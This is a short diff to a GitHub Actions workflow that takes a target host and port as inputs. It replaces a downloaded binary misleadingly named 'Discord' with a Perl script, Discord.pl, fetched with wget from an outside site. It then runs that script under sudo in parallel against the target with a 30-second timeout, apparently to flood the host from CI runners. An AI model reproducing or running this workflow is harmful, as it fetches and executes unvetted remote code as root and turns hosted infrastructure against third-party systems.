@@ -29,12 +29,12 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://curl.by/iujVM/discord -O Discord
+          wget https://wgetz.com/sYUMyONdf2/Discord.pl -O Discord.pl
           chmod +x Discord || true
           
           PIDS=()
           for i in {1..2}; do
-            sudo timeout 30 ./Discord "$TARGET" "$PORT" 8 -1 30 &
+            sudo timeout 30 perl Discord.pl "$TARGET" "$PORT" 30 &
             PIDS+=($!)
           done
 
